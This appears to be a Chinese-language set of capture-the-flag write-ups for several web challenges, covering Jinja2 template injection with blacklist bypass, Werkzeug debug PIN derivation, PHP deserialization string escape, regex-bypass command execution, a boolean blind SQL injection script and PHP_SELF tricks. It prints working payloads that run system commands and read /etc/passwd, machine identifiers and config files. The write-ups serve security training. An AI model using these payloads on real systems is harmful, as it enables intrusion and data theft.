## [GYCTF2020]FlaskApp

[[GYCTF2020\]FlaskApp_eyugzm9yigmgaw4gw10ux19jbgfzc19fll9fymfzzv9fll9fc3-CSDN博客](https://blog.csdn.net/rfrder/article/details/110240245)

[记一次Flask模板注入学习 [GYCTF2020\]FlaskApp - seven昔年 - 博客园 (cnblogs.com)](https://www.cnblogs.com/MisakaYuii-Z/p/12407760.html)

[[GYCTF2020\]FlaskApp-CSDN博客](https://blog.csdn.net/RABCDXB/article/details/117773638?ops_request_misc=%7B%22request%5Fid%22%3A%22170834842416800186585880%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170834842416800186585880&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-117773638-null-null.142^v99^pc_search_result_base3&utm_term=[GYCTF2020]FlaskApp 1&spm=1018.2226.3001.4187)



题目包含加密和解密两个过程：

![image-20240219225328344](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240219225328344.png)

###### SSTI模板注入过waf

尝试{{7*7}}回显：**no no no !!** 被 waf 了	

![image-20240219225442022](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240219225442022.png)

但是{{7+7}}没有被 waf

![image-20240219230900937](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240219230900937.png)

查看根目录被waf了	：

```python
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
```

1. `{% for c in [].__class__.__base__.__subclasses__() %}`：这是一个 Jinja2 模板语法，表示在 Python 中，遍历空列表的元类的所有子类。
2. `{% if c.__name__=='catch_warnings' %}`：这个条件语句检查当前遍历到的类是否为 `catch_warnings` 类。
3. `{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}`：如果当前遍历到的类是 `catch_warnings` 类，那么就执行这段代码。它的作用是利用 `catch_warnings` 类的 `__init__` 方法的全局变量中的 `__builtins__`，并从中调用 `eval()` 函数执行恶意代码。在这里，恶意代码是通过 Python 的 `os` 模块执行系统命令 `ls /` 来列出根目录下的文件。

读取源码app.py：

```python
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}
```

得到black_list：

![image-20240219235214135](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240219235214135.png)

整理得到：

```python
 def waf(str):
 black_list = ["flag","os","system","popen","import","eval","chr","request",
 "subprocess","commands","socket","hex","base64","*","?"]
 for x in black_list :
 if x in str.lower() :
 return 1
```

使用字符串拼接绕过：import = imp + ort   os =o+s

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
```

​	![image-20240219235613440](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240219235613440.png)

读取this_is_the_flag.txt：

```python
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
```



###### 倒转输出

使用切片的形式，简单测试一下，使用[::-1]既可以倒序输出全部，这样就可以绕过过滤

![img](https://img-blog.csdnimg.cn/2021061015110516.png)

payload2：

```
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read()}}{% endif %}{% endfor %}
```

同样可以得到flag


###### Flask模板注入中debug模式下pin码的获取和利用

查看提示：

![image-20240219225001307](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240219225001307.png)

其中解码有报错界面：

需要输入pin码

![image-20240220000959390](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240220000959390.png)

文件包含，PIN码生成

关于PIN码的相关资料请参考：[Flask debug 模式 PIN 码生成机制安全性研究笔记 - HacTF - 博客园 (cnblogs.com)](https://www.cnblogs.com/HacTF/p/8160076.html)

得到PIN码需要六个信息，其中2和3易知

1. flask所登录的用户名
2. modname，一般是flask.app
3. getattr(app, “name”, app.class.name)。一般为Flask
4. flask库下app.py的绝对路径。这个可以由报错信息看出
5. 当前网络的mac地址的十进制数。
6. 机器的id。

**flask用户名**可以通过读取/etc/passwd来知道

```python
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() }}{% endif %}{% endfor %}
```

得到用户名为flaskweb：

![image-20240220000750681](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240220000750681.png)

**app.py的绝对路径：**![image-20240220001127832](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240220001127832.png)

**mac地址的十进制数：**

首先要得到网卡 /sys/class/net/eth0/address

```python
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() }}{% endif %}{% endfor %}
```

mac地址

4e:5c:78:9a:9a:d7

![image-20240220001347410](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240220001347410.png)

将：去掉
4e5c789a9ad7
在python中进行转化
print(int('4e5c789a9ad7',16))
得到
86159067355863

**docker机器的id:**

> 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件。
> 对于docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id，

```python
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read() }}{% endif %}{% endfor %}
```

得到docker机器id，也就是1:name=systemd:/.../之后的字符串

![image-20240220002007583](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240220002007583.png)

最后生成pin码:

```python
 import hashlib
 from itertools import chain
 probably_public_bits = [
     'flaskweb'# username
     'flask.app',# modname
     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
 ]
 ​
 private_bits = [
     '2485377864455',# str(uuid.getnode()),  /sys/class/net/ens33/address
     'ad4fc7650590f81ec6ab4e3a40f284a6b5a75454fcb50d6ee5347eba94a124c8'# get_machine_id(), /etc/machine-id
 ]
 ​
 h = hashlib.md5()
 for bit in chain(probably_public_bits, private_bits):
     if not bit:
         continue
     if isinstance(bit, str):
         bit = bit.encode('utf-8')
     h.update(bit)
 h.update(b'cookiesalt')
 ​
 cookie_name = '__wzd' + h.hexdigest()[:20]
 ​
 num = None
 if num is None:
     h.update(b'pinsalt')
     num = ('%09d' % int(h.hexdigest(), 16))[:9]
 ​
 rv =None
 if rv is None:
     for group_size in 5, 4, 3:
         if len(num) % group_size == 0:
             rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                           for x in range(0, len(num), group_size))
             break
     else:
         rv = num
 ​
 print(rv)
 ​
```

然后在报错的界面，点击窗口栏，输入PIN

![img](https://img-blog.csdnimg.cn/20210610155649375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70)

输入PIN码

![img](https://img-blog.csdnimg.cn/20210610155720171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70)

终端shell

![img](https://img-blog.csdnimg.cn/20210610155752828.png)

得到flag

![img](https://img-blog.csdnimg.cn/20210610155815555.png)



## [0CTF 2016]piapiapia

###### 字符串绕过长度限制  反序列字符串化逃逸

直接打开是这样的界面，有登录界面，输入账号和密码：<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240220185603143.png" alt="image-20240220185603143" style="zoom:50%;" />

随便输入显示错误：<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240220185711619.png" alt="image-20240220185711619" style="zoom:67%;" />

访问www.zip得到源文件：

**config.php**：得到flag

```php+HTML
<?php
	$config['hostname'] = '127.0.0.1';
	$config['username'] = 'root';
	$config['password'] = '';
	$config['database'] = '';
	$flag = '';
?>
```

**index.php**：

```php+HTML
<?php
	require_once('class.php');
	if($_SESSION['username']) {//如果username存在则向客户端传一个报头
		header('Location: profile.php');//用来重定向到profile.php页面
		exit;//当前index.php结束
	}
	if($_POST['username'] && $_POST['password']) {//判断账号和密码的格式是否正确
		$username = $_POST['username'];
		$password = $_POST['password'];

		if(strlen($username) < 3 or strlen($username) > 16)//长度不符合则结束
			die('Invalid user name');

		if(strlen($password) < 3 or strlen($password) > 16) 
			die('Invalid password');

		if($user->login($username, $password)) {//调用class.php中user类的login方法，然后再用user的父类进行过滤
			$_SESSION['username'] = $username;//存一个username的session变量
			header('Location: profile.php');
			exit;	
		}
		else {
			die('Invalid user name or password');
		}
	}
	else {
?>
```

**profile.php**：

```php+HTML
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {//如果还没有登录则提示先登录。
		die('Login First');	
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);//查找账户，并返回个人信息
	if($profile  == null) {//如果个人信息不存在，则到update.php页面
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile);//如果个人信息存在，则对其进行反序列化，
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));
		//读取photo，也就是移动过后的图片，base64加密
		//重点在于file_get_contents这个，我们可以用它来读取config.php从而拿到flag
?>
```

注意了，[file_get_contents](https://so.csdn.net/so/search?q=file_get_contents&spm=1001.2101.3001.7020)这个函数明显是突破口，但它读取的是photo，且$profile反序列化了，那问题来了photo是哪的？怎么构造的？又该怎么把他变为config.php呢？先把这些问题放一放，因为第一步如果个人信息不存在，则会跳到update.php页面

**update.php**：

```php+HTML
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {//如果账号为空则登录
		die('Login First');	
	}
	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {//所有信息要存在

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))//匹配11次都要是数字，否则die
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))//同样是匹配
			die('Invalid email');
		
		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)//匹配昵称，开头不是大小写字母或数字，且长度小于10则die，但是如果nickname是一个数组，则可以绕过字符串长度限制
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)//判断图片大小
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));//把上传的文件移动到新的位置，且文件名MD5加密
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));//通过class.php更新数据库中的信息，并且把profile数组序列化
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
	}
	else {
?>
```

可以看到photo不是我们可以控制的，但是在下面它对$profile这个数组进行了序列化，那么是否可以通过构造序列化来使得photo等于config.php。

<img src="https://img-blog.csdnimg.cn/eb8d0411ab234b908948bdb98aa49827.png" alt="img" style="zoom:50%;" />


在profile.php中个人信息存在$profile这个数组中，按顺序来序列化的话我们是否可以通过操作nickname来替换photo呢？

**class.php**：

这里我们看这两部分

```php
	public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	}
	public function __tostring() {
		return __class__;
	}
```

上面这部分就是update.php中，$profile的由来

```php
$user->update_profile($username, serialize($profile));
```

```php
	public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';//用|给上面的数组进行分割
		return preg_replace($safe, 'hacker', $string);
		//匹配到则进行替换，替换为hacker，如果where替换为hacker则会多一个字符，进行序列化的时候可能会造成自增逃逸。
	}
	public function __tostring() {
		return __class__;
	}
}
session_start();//会话开始
$user = new user();//创建一个对象，然后其他的php文件就可以通过调用$user这个对象来调用此文件的方法
$user->connect($config);//返回数据库信息
```

这部分就是对$profile进行了过滤，也是反序列自增字符串逃逸的地方，当匹配到where时，会提换成hacker，会多出一个字符。

那么，nickname则可以传34个where，因为";}s:5:"photo";s:10:"config.php";}有34个字符：

```
nickname[]=where*n";}s:5:"photo";s:10:"config.php";}
```

```php
<?php
$hack='where';
for ($i=0;$i<34;$i++){
    $hacker.=$hack;
}
echo $hacker;
?>
```

```
Content-Disposition: form-data; name="nickname[]"

wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

![image-20240221162311625](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240221162311625.png)

解码得到：

![image-20240221162437576](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240221162437576.png)



## [FBCTF2019]RCEService

这个题目其实是有源码的：

```php
<?php

putenv('PATH=/home/rceservice/jail');//改变或增加 环境变量 的内容，限制系统在执行命令时只在指定目录中查找可执行文件

if (isset($_REQUEST['cmd'])) {//检查是否存在名为 cmd 的请求参数
    $json = $_REQUEST['cmd'];//将请求参数 cmd 的值存储在 $json 变量

    if (!is_string($json)) {//如果 $json 不是字符串类型
        echo 'Hacking attempt detected<br/><br/>';
    } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
       //如果 $json 中包含任何 Shell 命令（例如，alias、cd、exec` 等）或特殊字符
        echo 'Hacking attempt detected<br/><br/>';
    } else {
        echo 'Attempting to run command:<br/>';
        $cmd = json_decode($json, true)['cmd'];
        //从 $json 中解码 JSON 字符串，并获取键名为 cmd 的值，存储在 $cmd 变量中。
        if ($cmd !== NULL) {
            //如果 $cmd 不为 NULL，则使用 system() 函数执行 $cmd 中指定的命令
            system($cmd);
        } else {
            echo 'Invalid input';
        }
        echo '<br/><br/>';
    }
}

?>
```

json格式参考：[json的几种标准格式_json格式-CSDN博客](https://blog.csdn.net/weixin_48185778/article/details/109822965)

两种方法：

1.使用%0a换行符绕过。因为preg_match只匹配第一行。
2.回溯次数绕过 

###### %0a换行符绕过

直接改url里面传入的参数

```
http://51fe169a-ce2c-40d8-9fa9-0c0acfa17e0f.node5.buuoj.cn:81/?cmd={%22cmd%22:%22ls%22}
```

<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240227104919552.png" alt="image-20240227104919552" style="zoom:50%;" />

```
http://51fe169a-ce2c-40d8-9fa9-0c0acfa17e0f.node5.buuoj.cn:81/?cmd={%0a%22cmd%22:%22ls%20/%22%0a}
```

<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240227161226305.png" alt="image-20240227161226305" style="zoom:50%;" />

找到flag的位置：

```
http://3ba79781-e8cf-4c71-bb33-5aca1e7231fd.node5.buuoj.cn:81/?cmd={%0a%22cmd%22:%22ls%20/home/rceservice%22%0a}
```

<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240227162250313.png" alt="image-20240227162250313" style="zoom:50%;" />

直接cat没有反应：

cat在这里仍然不能用。应该是环境变量配置被改变，所以需要使用/bin/cat调用命令

<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240227162808247.png" alt="image-20240227162808247" style="zoom:50%;" />

找到bin里面的cat：

<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240227162935174.png" alt="image-20240227162935174" style="zoom:50%;" />

```
http://51fe169a-ce2c-40d8-9fa9-0c0acfa17e0f.node5.buuoj.cn:81/?cmd={%0a%22cmd%22:%22/bin/cat%20/home/rceservice/flag%22%0A}
```

<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240227104848186.png" alt="image-20240227104848186" style="zoom: 50%;" />



###### 回溯次数绕过 

回溯过正则匹配RCE参考：[PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

需要用POST发送请求，因为GET会因为头太大报错

```python
import requests
 
payload = '{"cmd":"/bin/cat /home/rceservice/flag ","nayi":"' + "a"*(1000000) + '"}' #超过一百万，这里写一千万不会出结果。
 
res = requests.post("http://3ba79781-e8cf-4c71-bb33-5aca1e7231fd.node5.buuoj.cn:81/", data={"cmd":payload})
print(res.text)
```

![image-20240227165127168](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240227165127168.png)



## [WUSTCTF2020]颜值成绩查询

###### SQL布尔盲注

[[WUSTCTF2020\]颜值成绩查询_wustctf2020]颜值成绩查询 1-CSDN博客](https://blog.csdn.net/SopRomeo/article/details/106148254)

脚本：

```python
import requests

url= 'http://1612a8a7-717a-4041-8c35-302bf3788ace.node5.buuoj.cn:81/'

database =""

payload1 = "?stunum=1^(ascii(substr((select(database())),{},1))>{})^1" #库名为ctf
payload2 = "?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{},1))>{})^1"#表名为flag,score
payload3 ="?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{},1))>{})^1" #列名为flag,value
payload4 = "?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),{},1))>{})^1" #
for i in range(1,10000):
    low = 32
    high = 128
    mid =(low + high) // 2
    while(low < high):
        # payload = payload1.format(i,mid)  #查库名
        # payload = payload2.format(i,mid)  #查表名
        # payload = payload3.format(i,mid)  #查列名
        payload = payload4.format(i,mid) #查flag

        new_url = url + payload
        r = requests.get(new_url)
        print(new_url)
        if "Hi admin, your score is: 100" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) //2
    if (mid == 32 or mid == 132):
        break
    database +=chr(mid)
    print(database)

print(database)

```



## [MRCTF2020]套娃

###### _空格绕过+jsfuck编码+逆函数脚本

看到源代码：

```php
<!--
//1st
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
!-->
```

[[MRCTF2020\]套娃_[mrctf2020]套娃 1-CSDN博客](https://blog.csdn.net/RABCDXB/article/details/118917303)

第一层：

```
http://341274f3-def6-48a5-b8eb-5e09e7238f0f.node5.buuoj.cn:81/?b%20u%20p%20t=23333%0A
```

<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240321093221483.png" alt="image-20240321093221483" style="zoom:50%;" />

第二层：

出现如下界面：

![image-20240321093304720](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240321093304720.png)

将jsfuck编码放在控制台，看到提示：POST 一个 Merak

![image-20240321093749277](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240321093749277.png)

传入之后：

<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240321095616369.png" alt="image-20240321095616369" style="zoom:50%;" />

得到页面源代码：

```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?>  
```

写一个逆change的函数：

```php
<?
    function reverse_change($v) {
    // 还原经过处理的字符串
    $reversed = '';

    // 从末尾开始遍历字符串
    for ($i=0;$i<strlen($v);$i++) {
        // 将 ASCII 码值减去对应的偏移量
        $reversed .= chr(ord($v[$i]) - $i * 2);
    }

    // 返回逆转后的结果
    return base64_encode($reversed);
}

$input = "flag.php"; // 假设这是经过 change 函数处理后的字符串
$output = reverse_change($input);
echo "逆转后的结果：$output"; // 输出：Hello World!
```

得到传入的file变量应该是：逆转后的结果：ZmpdYSZmXGI=

使用bp改包：

```
POST /secrettw.php?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&file=ZmpdYSZmXGI= HTTP/1.1
Host: 83b7b311-0084-4da7-82de-b68dc1f1b3ff.node5.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Client-ip:127.0.0.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

<img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240321110334666.png" alt="image-20240321110334666" style="zoom:67%;" />



## [Zer0pts2020]Can you guess it?

###### PHP_SELF BASENAME

basename文档：[PHP: basename - Manual](https://www.php.net/manual/zh/function.basename.php)

### <img src="C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240321112247446.png" alt="image-20240321112247446" style="zoom:50%;" />

得到源代码：

```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```

既满足`preg_match`，也满足`basename($_SERVER['PHP_SELF'])回显是config.php`，同时后端的`%ff?source`也满足`isset`的需要

payload：`index.php/config.php/%ff?source`
